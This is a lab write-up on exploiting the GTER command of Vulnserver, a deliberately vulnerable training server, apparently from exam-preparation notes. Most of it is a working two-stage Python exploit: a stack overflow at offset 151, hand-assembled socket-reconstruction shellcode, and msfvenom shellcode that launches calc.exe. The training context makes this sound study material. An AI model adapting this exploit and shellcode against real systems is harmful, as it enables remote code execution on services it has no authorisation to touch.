## <ins>GTER</ins>

As with TRUN and GMON, the prefix gets updated accordingly.

This time, there are two calls to `_strncpy`, one of them residing in `_Function1`:

![bc8935e6ca1ae81646852f309a997048.png](:../../../99\)%20Images/daa53b9ab822430992cbf166ec423086.png)

```Python
[...]

prefix = b'GTER '
buffer = b'A' * 4096

payload = prefix + buffer 

[...]
```

Following the execution flow in WinDbg reveals that the second `_strncpy` is vulnerable to a buffer overflow and EIP gets overwritten as soon as the function returns.

![372aa286a0f8a3156e6b4545b0cb2d4d.png](:../../../99\)%20Images/089bfc7c26c4473bacca004624b30a92.png)

After confirming that GTER is vulnerable, it is time to determine the exact offset to overwrite the instruction pointer:

```Python
[...]

prefix = b'GTER '
# msf-pattern_create -l 4096
buffer = 
b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7[...]f4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F'

payload = prefix + buffer 

[...]
```

EIP was overwritten with `66413066` which is equivalent to the offset 151 in the unique pattern.

Adjusting the script and checking for the available buffer space shows, that it is very limited:

```Python
[...]

prefix = b'GTER '
buffer = b'A' * 151
eip = b'BBBB'
junk = b'C' * 2000

payload = prefix + buffer + eip + junk

[...]
```

![249d4c7337cdddc2ff23af94b9c23219.png](:../../../99\)%20Images/58c30c6fc3b840e7b06a067a72210ce3.png)

This means, it is required to either use jumpcode or an egghunter in order to execute the actual shellcode.

There is very little space available in general, because of that a technique called *socket reuse* will be used.
This technique is explained way more detailed here:

- [https://connormcgarr.github.io/WS32_recv()-Reuse/](https://connormcgarr.github.io/WS32_recv%28%29-Reuse/ "https://connormcgarr.github.io/WS32_recv()-Reuse/")
- https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
- https://zflemingg1.gitbook.io/undergrad-tutorials/walkthroughs-osce/vulnserver-gter-command

### Socket Reconstructing Technique

The application was started via WinDbg so that it gets interrupted immediately, then the following breakpoints were set:

```Text
bp ws2_32!socket
bp ws2_32!bind
bp ws2_32!listen
bp ws2_32!accept
bp ws2_32!recv
```

Afterwards, the execution was continued and the PoC script executed to obtain the address of calls to the functions listed above:

| Address | Function |
| --- | --- |
| `0040156C` | ws2_32!socket |
| `004015E0` | ws2_32!bind |
| `00401653` | ws2_32!listen |
| `004016DA` | ws2_32!accept |
| `00401953` | ws2_32!recv |

```Python
#!/usr/bin/python3

import socket, sys
from struct import pack
from time import sleep


ip = sys.argv[1]
port = 9999		

length = 151

prefix = b'GTER '
buffer = None
eip = pack('<L', 0x625011af)

jumpcode = b'\xe9\x60\xff\xff\xff'      # Backwards jump of 0x60

#WS32_recv() reuse

# ws2_32!socket (2, 1, 6)

re = b'\x83\xEC\x50'      # sub esp, 0x50
re += b'\x83\xEC\x50'     # sub esp, 0x50

re += b'\x31\xC0'         # xor eax, eax
re += b'\xB0\x06'         # mov al, 0x6
re += b'\x50'           # push eax
re += b'\xB0\x01'         # mov al, 0x1
re += b'\x50'           # push eax
re += b'\x40'           # inc eax
re += b'\x50'           # push eax
re += b'\xBB\x11\x7C\x25\x40'   # mov ebx, 0x40256c11
re += b'\xC1\xEB\x08'   # shr ebx, byte 0x8
re += b'\xff\xd3'       # call ebx
re += b'\x89\xC7'       # mov edi, eax 

'''
EDI holds the file descriptor
ws2_32!socket was called
'''

# WS2_32!bind (socket, name, namelen)

re += b'\x31\xC0'       # xor eax, eax 
re += b'\x50'           # push eax
re += b'\x50'           # push eax

re += b'\xBA\x02\xFF\x1A\x0A'   # mov edx, 0xa1aff02
re += b'\x30\xf6'   # xor dx, dx

re += b'\x54'           # push esp
re += b'\x59'           # pop ecx 

re += b'\x6A\x16'       # push 0x16 
re += b'\x89\x11'       # mov DWORD PTR [ecx], edx
re += b'\x51'           # push ecx 
re += b'\xb3\x64'       # mov bl, 0x64

re += b'\x57'           # push edi (file descriptor)
re += b'\xff\xd3'       # call ebx

# WS2_32!listen 

re += b'\xb3\x54'       
re += b'\x6a\x7f'       # BACKLOG (Pushed to stack)
re += b'\x57'           # push edi (socket descriptor)
re += b'\xff\xd3'       # call ebx (invoke the listener function)

# WS2_32!accept 

re += b'\x50'           # push eax
re += b'\x50'           # push eax
re += b'\x57'           # push edi (file descriptor)
re += b'\xb3\x4c'       # mov bl, 0x4c
re += b'\xff\xd3'       # call ebx

# ws2_32!recv 

re += b'\x89\xC7'       # mov edi, eax (saves the return value from WS2_32!accept)
re += b'\x31\xC0'       # xor eax, eax 
re += b'\x50'           # push eax  (flags param)
re += b'\xb4\x02'       # mov ah, 0x2
re += b'\x50'           # push eax  (buffer len (512 bytes))

re += b'\x54'           # push esp
re += b'\x59'           # pop ecx 
re += b'\x66\x83\xC2\x65'   # add dx, byte +0x65
re += b'\x66\x83\xC2\x60'   # add dx, byte +0x65
re += b'\x51'           # push ecx 

re += b'\x57'           # push edi (socket handler)
re += b'\xB3\x2C'       # mov bl, 0x2c
re += b'\xff\xd3'       # call ebx

  


buffer = b"\x90" * 4 + re + b'\x90' * (length - len(re)- 4)

payload = prefix + buffer + eip + jumpcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        print('[*] Sending stage 1')
        s.send(payload)
except Exception as e:
    print(e)
    sys.exit(0)

#input('waiting to connect...')
sleep(3)

nopsled = b'\x90' * 200

# msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f py -v shellcode
shellcode =  b""
shellcode += b"\xda\xda\xd9\x74\x24\xf4\xbb\x43\x24\xcc\xc7"
shellcode += b"\x5d\x2b\xc9\xb1\x31\x31\x5d\x18\x83\xc5\x04"
shellcode += b"\x03\x5d\x57\xc6\x39\x3b\xbf\x84\xc2\xc4\x3f"
shellcode += b"\xe9\x4b\x21\x0e\x29\x2f\x21\x20\x99\x3b\x67"
shellcode += b"\xcc\x52\x69\x9c\x47\x16\xa6\x93\xe0\x9d\x90"
shellcode += b"\x9a\xf1\x8e\xe1\xbd\x71\xcd\x35\x1e\x48\x1e"
shellcode += b"\x48\x5f\x8d\x43\xa1\x0d\x46\x0f\x14\xa2\xe3"
shellcode += b"\x45\xa5\x49\xbf\x48\xad\xae\x77\x6a\x9c\x60"
shellcode += b"\x0c\x35\x3e\x82\xc1\x4d\x77\x9c\x06\x6b\xc1"
shellcode += b"\x17\xfc\x07\xd0\xf1\xcd\xe8\x7f\x3c\xe2\x1a"
shellcode += b"\x81\x78\xc4\xc4\xf4\x70\x37\x78\x0f\x47\x4a"
shellcode += b"\xa6\x9a\x5c\xec\x2d\x3c\xb9\x0d\xe1\xdb\x4a"
shellcode += b"\x01\x4e\xaf\x15\x05\x51\x7c\x2e\x31\xda\x83"
shellcode += b"\xe1\xb0\x98\xa7\x25\x99\x7b\xc9\x7c\x47\x2d"
shellcode += b"\xf6\x9f\x28\x92\x52\xeb\xc4\xc7\xee\xb6\x82"
shellcode += b"\x16\x7c\xcd\xe0\x19\x7e\xce\x54\x72\x4f\x45"
shellcode += b"\x3b\x05\x50\x8c\x78\xe9\xb2\x05\x74\x82\x6a"
shellcode += b"\xcc\x35\xcf\x8c\x3a\x79\xf6\x0e\xcf\x01\x0d"
shellcode += b"\x0e\xba\x04\x49\x88\x56\x74\xc2\x7d\x59\x2b"
shellcode += b"\xe3\x57\x3a\xaa\x77\x3b\x93\x49\xf0\xde\xeb"

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, 6666))
        print('[*] Sending stage 2')
        #input('waiting to send...')
        sleep(1)
        s.send(nopsled + shellcode)
except Exception as e:
    print(e)
    sys.exit(0)
```
